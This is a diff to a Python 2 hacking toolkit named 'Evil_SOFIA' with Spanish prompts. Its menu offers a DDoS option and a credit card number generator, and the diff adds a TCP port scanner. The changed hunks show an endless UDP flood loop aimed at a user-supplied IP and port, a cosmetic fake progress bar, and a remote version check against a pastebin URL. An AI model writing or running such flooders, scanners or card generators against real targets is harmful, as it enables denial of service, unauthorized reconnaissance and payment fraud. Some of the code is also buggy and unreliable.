@@ -36,7 +36,7 @@ msg00 = "OOO\n"
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.5)
+        time.sleep(0.3)
 
 vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
 
@@ -48,7 +48,7 @@ for i in ms0g:
         sys.stdout.flush()
         time.sleep(0.02)
 """
-if vers=="3.9":
+if vers=="4.1":
     pass
 else:
  print("There is New Version available !! Do you Want To Update Your tool ? ")
@@ -112,6 +112,7 @@ while True:
     print("   8.HOST TO IP")
     print("   9.STEAD - DDOS (LVL 4)")
     print("   10.CCGEN")
+    print("   11.PORT SCANNER")
     print("   99.Salir")
     print("")
     opc = input("  Digite el numero de la opcion: ")
@@ -255,19 +256,16 @@ $$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |
         ip = raw_input("IP Target : ")
         port = input("Port       : ")
 
-        os.system("cls")
+        os.system("clear")
         os.system("echo INICIANDO ATAQUE! ")
-        print "[                    ] 0% "
-        time.sleep(1)
-        print "[=====               ] 25%"
+        
+        limonja= "[====================] 100%"
+        for i in limonja:
+            sys.stdout.write(i)
+            sys.stdout.flush()
+            time.sleep(0.2)
         time.sleep(2)
-        print "[==========          ] 50%"
-        time.sleep(3)
-        print "[===============     ] 75%"
-        time.sleep(4)
-        print "[====================] 100%"
-        time.sleep(5)
-        sent = 0
+        sent=0
         while True:
              sock.sendto(bytes, (ip,port))
              sent = sent + 1
@@ -684,6 +682,44 @@ SSSS    TT   EEEE A  A DDD'''
 
         output = map(str, newcard)
         print "".join(output) +(otsu)
+     elif opc==11:
+        import socket
+        import subprocess
+        import sys
+        from datetime import datetime
+        print("PORT SCANNER V-0.1 - BETA")
+        subprocess.call('clear', shell=True)
+
+        remoteServer    = raw_input("HOST A ESCANEAR: : ")
+        remoteServerIP  = socket.gethostbyname(remoteServer)
+        print "-" * 60
+        print "ESPERA, ESCANEANDO HOST REMODTO: ", remoteServerIP
+        print "-" * 60
+
+
+        t1 = datetime.now()
+        try:
+            for port in range(1,1025):  
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                result = sock.connect_ex((remoteServerIP, port))
+                if result == 0:
+                    print "Port {}:    Open".format(port)
+                sock.close()
+
+        except KeyboardInterrupt:
+            print "INTERRUMPIDO"
+            sys.exit()
+
+        except socket.gaierror:
+            print 'Hostname could not be resolved. Exiting'
+            sys.exit()
+
+        except socket.error:
+            print "Couldn't connect to server"
+            sys.exit()
+        t2 = datetime.now()
+        total =  t2 - t1
+        print 'Scanning Completed in: ', total
     elif opc==99:
         pris = "Gracias Por Utlizar Evil_SOFIA.  VERSION:" + vrs
         for i in pris:
@@ -692,3 +728,4 @@ SSSS    TT   EEEE A  A DDD'''
          time.sleep(0.02)
         break;
         exit()
+    
